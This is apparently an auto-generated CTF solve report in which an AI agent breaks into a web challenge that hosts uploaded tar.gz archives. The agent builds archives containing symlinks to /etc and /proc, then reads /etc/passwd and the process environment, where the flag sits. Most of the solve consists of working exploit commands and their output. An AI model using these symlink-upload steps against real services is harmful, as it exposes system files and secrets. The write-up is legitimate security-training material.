# Mediary [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 2
- **Flag**: `FLAG{t4r-syml1nk-upl04d-byp4ss}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.01)
- **Wall time**: 16m44s
- **Traces**: 3

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Mediary hosts media bundles. Upload a .tar.gz archive and we extract and host each
file for you at /u/.
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8017
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 21 | $0.01 | 1m43s | `trace-Mediary_[MEDIUM]-deepseek-flash-20261029-125912.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 10 | $0.00 | 1m06s | `trace-Mediary_[MEDIUM]-deepseek-flash-20261029-131448.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 0s | `trace-Mediary_[MEDIUM]-claude-opus-4-6-20261029-131448.jsonl` |

_Window: 2026-10-29T12:59:20 to 2026-10-29T13:16:04_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8017/ | head -50",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 09:59:22 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 4125

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Mediary — Uploads</title>
<style>
  :root{--bg:#fffbeb;--panel:#fff;--ink:#422006;--muted:#8a6a2f;--line:#fde68a;
        --brand:#ca8a04;--brand-ink:#a16207;--brand-soft:#fef3c7;--shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#fbbf24,#ca8a04);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8017/ | tail -40",
  "timeout_seconds": 60
}
~~~

~~~
</style>
</head>
<body>
<header class="topbar">
  <div class="brand"><span class="logo">M</span> Mediary</div>
  <nav class="top-nav"><a class="active">Uploads</a><a>Library</a><a>Docs</a></nav>
  <div class="muted">media hosting</div>
</header>
<div class="wrap">
  <div class="page-head"><h2>Upload an archive</h2><div class="sub">Upload a <span class="code">.tar.gz</span> bundle. We extract it and host each file at <span class="code">/u/&lt;name&gt;</span>.</div></div>
  <div class="card">
    <h3>Upload</h3>
    <form id="form" enctype="multipart/form-data">
      <div class="drop">
        <div class="muted">Drop a <b>.tar.gz</b> archive here, or choose a file</div>
        <input type="file" name="archive" id="archive" accept=".tar,.gz,.tgz">
      </div>
      <div style="margin-top:12px"><button class="btn" id="go" type="submit">Upload & extract</button></div>
    </form>
    <div class="out" id="out"></div>
    <div class="foot">Extracted files are served from <span class="code">/tmp/mediary/uploads</span> at <span class="code">/u/&lt;name&gt;</span>. Path traversal in file names is blocked. API: <span class="code">POST /api/upload</span></div>
  </div>
  <div class="card">
... [1790 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /tmp; curl -s 'http://chal2.hackathon.ke:8017/view?name=welcome.txt'; echo; curl -s 'http://chal2.hackathon.ke:8017/view?name=../app.py' | head -100",
  "timeout_seconds": 60
}
~~~

~~~
<!doctype html><html><head><meta charset=utf-8>
<title>Mediary — welcome.txt</title>
<style>body{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#fffbeb;color:#422006;margin:0;padding:30px}
.bar{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#fbbf24,#ca8a04);display:grid;place-items:center;color:#fff;font-weight:800}
.card{max-width:760px;background:#fff;border:1px solid #fde68a;border-radius:12px;padding:20px 22px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.name{font-family:ui-monospace,Menlo,monospace;color:#92610a} pre{background:#fffdf5;border:1px solid #fde68a;border-radius:9px;padding:14px;white-space:pre-wrap;word-break:break-word;font-family:ui-monospace,Menlo,monospace;font-size:13px}</style></head>
<body><div class="bar"><span class="logo">M</span><b>Mediary</b> &nbsp;<span class="name">/u/welcome.txt</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>Welcome to Mediary. Upload a .tar.gz; files are served at /u/&lt;name&gt;.
</pre></div></body></html>
invalid name
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /tmp; for n in ..%2fapp.py ..%2f..%2fapp.py /etc/passwd %2fetc%2fpasswd file:///etc/passwd welcome.txt .../app.py .../../app.py; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | tail -c 300; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== ..%2fapp.py
invalid name
== ..%2f..%2fapp.py
invalid name
== /etc/passwd
invalid name
== %2fetc%2fpasswd
invalid name
== file:///etc/passwd
font-family:ui-monospace,Menlo,monospace;font-size:13px}</style></head>
<body><div class="bar"><span class="logo">M</span><b>Mediary</b> &nbsp;<span class="name">/u/file:///etc/passwd</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>(not found)</pre></div></body></html>
== welcome.txt
/style></head>
<body><div class="bar"><span class="logo">M</span><b>Mediary</b> &nbsp;<span class="name">/u/welcome.txt</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>Welcome to Mediary. Upload a .tar.gz; files are served at /u/&lt;name&gt;.
</pre></div></body></html>
== .../app.py
ak-word;font-family:ui-monospace,Menlo,monospace;font-size:13px}</style></head>
<body><div class="bar"><span class="logo">M</span><b>Mediary</b> &nbsp;<span class="name">/u/.../app.py</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>(not found)</pre></div></body></html>
== .../../app.py
invalid name
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /tmp; mkdir -p t && cd t; echo hello > a.txt; ln -s /etc/passwd link; ln -s /etc linkdir; tar czf ../a.tgz a.txt link linkdir; cd ..; curl -s -F 'archive=@a.tgz' http://chal2.hackathon.ke:8017/api/upload; echo; curl -s 'http://chal2.hackathon.ke:8017/view?name=linkdir/passwd' | tail -c 300",
  "timeout_seconds": 60
}
~~~

~~~
{"extracted":["a.txt","link","linkdir"],"note":"files are served at /u/<name>","ok":true,"rejected":[]}

/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
app:x:999:999::/home/app:/bin/sh
</pre></div></body></html>
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /tmp; curl -s 'http://chal2.hackathon.ke:8017/view?name=linkdir/environ' | tail -c 500; echo; for p in app.py /app/app.py etc/hostname proc/self/cmdline; do echo \"== $p\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=linkdir/../$p\" | tail -c 200; done",
  "timeout_seconds": 60
}
~~~

~~~
x rgba(0,0,0,.08)}
.name{font-family:ui-monospace,Menlo,monospace;color:#92610a} pre{background:#fffdf5;border:1px solid #fde68a;border-radius:9px;padding:14px;white-space:pre-wrap;word-break:break-word;font-family:ui-monospace,Menlo,monospace;font-size:13px}</style></head>
<body><div class="bar"><span class="logo">M</span><b>Mediary</b> &nbsp;<span class="name">/u/linkdir/environ</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>(not found)</pre></div></body></html>
== app.py
invalid name== /app/app.py
invalid name== etc/hostname
invalid name== proc/self/cmdline
invalid name
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /tmp; for f in app.py run.py main.py wsgi.py requirements.txt entrypoint.sh Dockerfile flag.txt flag app/flag.txt; do echo \"== $f\"; curl -s \"http://chal2.hackathon.ke:8017/u/../$f\" | head -c 200; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== app.py
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai
== run.py
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai
== main.py
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai
== wsgi.py
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai
== requirements.txt
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai
== entrypoint.sh
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
... [2000 chars total]
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /tmp; for u in '/u/linkdir/proc/self/cmdline' '/u/linkdir%2fproc%2fself%2fcmdline' '/u/linkdir/app/app.py' '/u/linkdir/home/app' '/u/linkdir/app/' '/u/linkdir/.' '/u/linkdir'; do echo \"== $u\"; curl -s -i \"http://chal2.hackathon.ke:8017$u\" | head -20; done",
  "timeout_seconds": 60
}
~~~

~~~
== /u/linkdir/proc/self/cmdline
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 09:59:58 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir%2fproc%2fself%2fcmdline
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 09:59:58 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir/app/app.py
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 09:59:59 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir/home/app
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 09:59:59 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir/app/
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:00 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir/.
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:01 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdir
HTTP/1.1 404 NOT FOUND
... [1384 chars total]
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /tmp; echo '#!/bin/sh' > x; for n in 'linkdir/..%2fproc%2fself%2fcmdline' 'link%00' 'linkdir/app' '../x' '..%2f' '%2e%2e' 'a.txt/' 'linkdir/%2e%2e' 'linkdir/./../proc/self/environ'; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | tail -c 150; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== linkdir/..%2fproc%2fself%2fcmdline
invalid name
== link%00
r encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

== linkdir/app
<span class="name">/u/linkdir/app</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>(not found)</pre></div></body></html>
== ../x
invalid name
== ..%2f
invalid name
== %2e%2e
invalid name
== a.txt/
nbsp;<span class="name">/u/a.txt/</span></div>
<div class="card"><h3 style="margin-top:0">File contents</h3><pre>(not found)</pre></div></body></html>
== linkdir/%2e%2e
invalid name
== linkdir/./../proc/self/environ
invalid name
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /tmp; for n in 'linkdir/app.py' 'linkdir/app' 'linkdir/flag.txt' 'linkdir/tmp/mediary/uploads/a.txt' 'linkdir/root' 'linkdir/bin/sh' 'linkdir/proc/self/cwd/a.txt'; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | grep -o '<pre>.*' | head -c 300; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== linkdir/app.py
<pre>(not found)</pre></div></body></html>

== linkdir/app
<pre>(not found)</pre></div></body></html>

== linkdir/flag.txt
<pre>(not found)</pre></div></body></html>

== linkdir/tmp/mediary/uploads/a.txt
<pre>(not found)</pre></div></body></html>

== linkdir/root
<pre>(not found)</pre></div></body></html>

== linkdir/bin/sh
<pre>(not found)</pre></div></body></html>

== linkdir/proc/self/cwd/a.txt
<pre>(not found)</pre></div></body></html>
~~~

### Step 12: `bash`
~~~
{
  "command": "cd /tmp; for n in 'linkdir/passwd' 'linkdir/passwd%20' 'linkdir//passwd' 'linkdir/.' 'linkdir/..' 'linkdir/passwd/x'; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | grep -o '<pre>.*' | head -c 200; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== linkdir/passwd
<pre>root:x:0:0:root:/root:/bin/bash

== linkdir/passwd%20
<pre>(not found)</pre></div></body></html>

== linkdir//passwd
<pre>root:x:0:0:root:/root:/bin/bash

== linkdir/.
<pre>(not found)</pre></div></body></html>

== linkdir/..

== linkdir/passwd/x
<pre>(not found)</pre></div></body></html>
~~~

### Step 13: `bash`
~~~
{
  "command": "cd /tmp; for n in 'linkdir/etc/passwd' 'linkdir//etc/passwd' 'linkdir/tmp/mediary/uploads/a.txt' 'linkdir/etc/hostname' 'linkdir/proc/version' 'linkdir/home/app'; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | grep -o '<pre>.*' | head -c 200; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== linkdir/etc/passwd
<pre>(not found)</pre></div></body></html>

== linkdir//etc/passwd
<pre>(not found)</pre></div></body></html>

== linkdir/tmp/mediary/uploads/a.txt
<pre>(not found)</pre></div></body></html>

== linkdir/etc/hostname
<pre>(not found)</pre></div></body></html>

== linkdir/proc/version
<pre>(not found)</pre></div></body></html>

== linkdir/home/app
<pre>(not found)</pre></div></body></html>
~~~

### Step 14: `bash`
~~~
{
  "command": "cd /tmp; for u in /u/linkdir/passwd /u//linkdir/passwd /u/linkdir//passwd /u/a.txt/ /view; do echo \"== $u\"; curl -s -i \"http://chal2.hackathon.ke:8017$u\" | head -12; done",
  "timeout_seconds": 60
}
~~~

~~~
== /u/linkdir/passwd
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:30 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 872

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
== /u//linkdir/passwd
HTTP/1.1 308 PERMANENT REDIRECT
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:31 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 281
Location: http://chal2.hackathon.ke:8017/u/linkdir/passwd

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
== /u/linkdir//passwd
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:32 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 872

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
== /u/a.txt/
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:32 GMT
Connection: close
Content-Type: application/json
Content-Length: 22
... [1436 chars total]
~~~

### Step 15: `bash`
~~~
{
  "command": "cd /tmp; for u in /u/link/proc/proc/self/environ '/u/link/proc/proc/self/cmdline' '/u/linkdirproc/self/environ' ; do echo \"== $u\"; curl -s -i \"http://chal2.hackathon.ke:8017$u\" | head -20; done",
  "timeout_seconds": 60
}
~~~

~~~
== /u/link/proc/proc/self/environ
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:35 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/link/proc/proc/self/cmdline
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:36 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
== /u/linkdirproc/self/environ
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:36 GMT
Connection: close
Content-Type: application/json
Content-Length: 22

{"error":"not found"}
~~~

### Step 16: `bash`
~~~
{
  "command": "cd /tmp; for n in 'linkdir/usr/lib/python3.11/os.py' 'linkdir/usr/bin/python3' 'linkdir/bin/python3' 'linkdir/bin/sh' 'linkdir/bin/ls' 'linkdir/etc/os-release' 'linkdir/passwd' 'linkdir//passwd'; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | grep -o '<pre>.*' | head -c 150; echo; done; curl -s http://chal2.hackathon.ke:8017/nonexist | head -5",
  "timeout_seconds": 60
}
~~~

~~~
== linkdir/usr/lib/python3.11/os.py
<pre>(not found)</pre></div></body></html>

== linkdir/usr/bin/python3
<pre>(not found)</pre></div></body></html>

== linkdir/bin/python3
<pre>(not found)</pre></div></body></html>

== linkdir/bin/sh
<pre>(not found)</pre></div></body></html>

== linkdir/bin/ls
<pre>(not found)</pre></div></body></html>

== linkdir/etc/os-release
<pre>(not found)</pre></div></body></html>

== linkdir/passwd
<pre>root:x:0:0:root:/root:/bin/bash

== linkdir//passwd
<pre>root:x:0:0:root:/root:/bin/bash

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
~~~

### Step 17: `bash`
~~~
{
  "command": "cd /tmp; rm -rf t2; mkdir t2; cd t2; python3 -c \"\nimport tarfile,io\ndata=b'A'*2000000\nti=tarfile.TarInfo('big.txt'); ti.size=len(data)\nopen('big','wb').write(data)\n\" ; ln -s proc/self/cwd/../../ p2; ln -s /proc/../ c2; ln -s proc/self/fd cwdlink; ln -s app/app.py p3; ln -s /app . 2>/dev/null; mkdir -p d; ln -s ../.. pp; tar czf ../b.tgz *; cd ..; curl -s -F 'archive=@b.tgz' http://chal2.hackathon.ke:8017/api/upload; echo; for n in p2/bin/sh p2/usr/bin/python3 pp/bin/sh p3 c2/etc/hostname; do echo \"== $n\"; curl -s \"http://chal2.hackathon.ke:8017/view?name=$n\" | grep -o '<pre>.*' | head -c 150; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
{"extracted":["app","big","c2","cwdlink","d","p2","p3","pp"],"note":"files are served at /u/<name>","ok":true,"rejected":[]}

== p2/bin/sh
<pre>(not found)</pre></div></body></html>

== p2/usr/bin/python3
<pre>(not found)</pre></div></body></html>

== pp/bin/sh
<pre>(not found)</pre></div></body></html>

== p3
<pre>(not found)</pre></div></body></html>

== c2/etc/hostname
<pre>07c4b42f9a1d
~~~

### Step 18: `bash`
~~~
{
  "command": "cd /tmp; for u in '/u/c2/proc/self/environ' '/u/c2/proc/1/environ' '/u/c2/proc/self/cmdline' '/u/c2/proc/1/cmdline'; do echo \"== $u\"; curl -s -i \"http://chal2.hackathon.ke:8017$u\" | head -20; done",
  "timeout_seconds": 60
}
~~~

~~~
== /u/c2/proc/self/environ
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:54 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 319

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=07c4b42f9a1d FLAG=FLAG{t4r-syml1nk-upl04d-byp4ss} LANG=C.UTF-8 GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_VERSION=3.12.15 PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a HOME=/home/app == /u/c2/proc/1/environ
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:55 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 319

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=07c4b42f9a1d FLAG=FLAG{t4r-syml1nk-upl04d-byp4ss} LANG=C.UTF-8 GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_VERSION=3.12.15 PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a HOME=/home/app == /u/c2/proc/self/cmdline
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:00:55 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 79

... [1512 chars total]
~~~

### Step 19: `submit_flag`
~~~
{
  "flag": "FLAG{t4r-syml1nk-upl04d-byp4ss}"
}
~~~

~~~
DRY RUN — would submit "FLAG{t4r-syml1nk-upl04d-byp4ss}" but --no-submit is set.
~~~

### Step 20: `bash`
~~~
{
  "command": "echo done",
  "timeout_seconds": 60
}
~~~

~~~
done
~~~

### Step 21: `submit_flag`
~~~
{
  "flag": "FLAG{t4r-syml1nk-upl04d-byp4ss}"
}
~~~

~~~
DRY RUN — would submit "FLAG{t4r-syml1nk-upl04d-byp4ss}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{t4r-syml1nk-upl04d-byp4ss}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.01 (winner), $0.01 (whole swarm)
- **Wall time**: 16m44s
- **Generated**: 2026-10-30T00:14:55
